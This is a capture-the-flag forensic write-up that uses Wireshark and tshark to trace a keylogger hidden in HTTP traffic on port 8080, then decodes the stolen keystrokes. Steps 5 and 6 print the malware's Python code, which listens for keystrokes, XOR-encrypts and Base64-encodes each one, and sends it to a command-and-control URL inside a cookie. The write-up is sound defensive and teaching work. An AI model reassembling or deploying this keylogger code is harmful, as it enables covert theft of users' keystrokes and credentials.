🕵️ Packed Light: Detecting Data Exfiltration in PCAPs
=====================================================
Tiny packets. Odd hours. Suspiciously regular.  
Sometimes, malicious activity hides in plain sight—like someone smuggling out the digital equivalent of a hotel towel every night, neatly folded inside traffic that looks ordinary until you decode it. This challenge demonstrates how subtle exfiltration can be uncovered using Wireshark and a bit of persistence.

Step 1: Initial PCAP Analysis
-----------------------------
Opening the capture file in Wireshark, I began with a broad inspection of traffic patterns. From @0xmia’s story clue, the suspicious destination port was identified as:

<img width="313" height="185" alt="packed_light_1_hint_port" src="https://github.com/user-attachments/assets/90b64d7b-d6be-46a0-9025-a04d5265df0d" />

Step 2: Filtering HTTP Traffic by Port
--------------------------------------
To isolate relevant traffic, I applied a filter:
```
tcp.port == 8080
```
This revealed HTTP traffic flowing through port 8080.

<img width="925" height="386" alt="packed_light_1_port_filter" src="https://github.com/user-attachments/assets/04c92ea9-5c19-4e05-aa74-e0bd910f98dc" />

Step 3: Narrowing Down the Filter
---------------------------------
To refine further, I combined conditions:
```
tcp.port == 8080 && ip.dst == 34.41.103.191 && http
```
This narrowed the view to HTTP traffic directed at the suspicious IP.

<img width="929" height="338" alt="packed_light_1_protocol_filter" src="https://github.com/user-attachments/assets/2aed36b4-7df2-4ab9-8e2d-840bf44ad530" />

Step 4: Extracting Objects
---------------------------
Using File → Export Objects → HTTP, I extracted a Python file embedded in the traffic.

<img width="710" height="322" alt="packed_light_1_python_file" src="https://github.com/user-attachments/assets/eb52e007-0ad4-41fb-8640-fbd6b8ee1a95" />

Step 5: Analyzing the Python File
---------------------------------
The script revealed a keylogger that captured every keystroke and sent it to the attacker’s server:
```
def on_press(key):
    try:
        sendltr(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            sendltr(" ")
        elif key == keyboard.Key.enter:
            sendltr("\n")

print("[*] Byte Lotus Sync Service started...")
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
```
The program masqueraded as a “Byte Lotus Sync Service” while silently logging input.

Step 6: Encryption & Encoding
-----------------------------
The CTF used a combination of XOR cipher and Base64 encoding to obfuscate data before exfiltration:
```
def xor(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

def sendltr(character):
    raw_bytes = character.encode('utf-8')
    encrypted = xor(raw_bytes, getkey().encode('utf-8'))
    
    b64_string = base64.b64encode(encrypted).decode('utf-8')
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ByteLotusClient/1.1",
        "Cookie": f"hotel_sess_state={b64_string}"
    }    
    try:
        requests.get(C2_URL, headers=headers, timeout=0.5)
    except:
        pass
```
The encoded payload was hidden inside HTTP cookies.

<img width="740" height="295" alt="packed_light_1_cookie" src="https://github.com/user-attachments/assets/bb1407df-6539-4c2e-a2cf-0ca42839d2ca" />

Step 7: Extracting Cookies with Tshark
--------------------------------------
To automate extraction, I used tshark:
```
tshark -r capture.pcap -Y "http.cookie" -T fields -e http.cookie > cookies.txt
```
Then stripped the prefix:
```
sed 's/hotel_sess_state=//g' cookies.txt > cipher.txt
```
Step 8: Decrypting the Cipher
-----------------------------
By reversing the Python script logic and applying the XOR + Base64 decoding, the hidden keystrokes were revealed.
```
import base64

def getkey():
    p1 = "H0t3lSt@ff0Nly"
    p2 = "K3epS3cr3t!"
    return p1 + p2

def xor(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

def decode_cookie(b64_string):
    # Step 1: Base64 decode
    encrypted = base64.b64decode(b64_string.strip())
    
    # Step 2: XOR decrypt with the same key
    decrypted = xor(encrypted, getkey().encode('utf-8'))
    
    # Step 3: Convert back to plain text
    return decrypted.decode('utf-8', errors='ignore')

def process_file(filename):
    plaintext_output = []
    with open(filename, "r") as f:
        for line in f:
            if line.strip():  # skip empty lines
                decoded = decode_cookie(line)
                plaintext_output.append(decoded)
    # Print the full reconstructed text at the end
    print("".join(plaintext_output))

# Example usage:
# Save your cookie values (one per line) in 'cookies.txt'
process_file("cipher.txt")
```
Using an AI-assisted tool accelerated the decryption process, confirming the CTF’s method of exfiltration.

The investigation uncovered a keylogger using HTTP cookies for covert data exfiltration. Each keystroke was encrypted, encoded, and smuggled out via seemingly harmless traffic.

🔒 Recommendations
-------------------
- Monitor unusual ports: HTTP traffic on non-standard ports (like 8080) should raise suspicion.
- Inspect cookies: Cookies can be abused for covert channels; regular audits are essential.
- Automate detection: Use IDS/IPS rules to flag repetitive small packets or odd-hour transmissions.
- Threat hunting: Incorporate XOR/Base64 detection in forensic workflows.
- User awareness: Keyloggers often rely on social engineering—training users reduces risk.
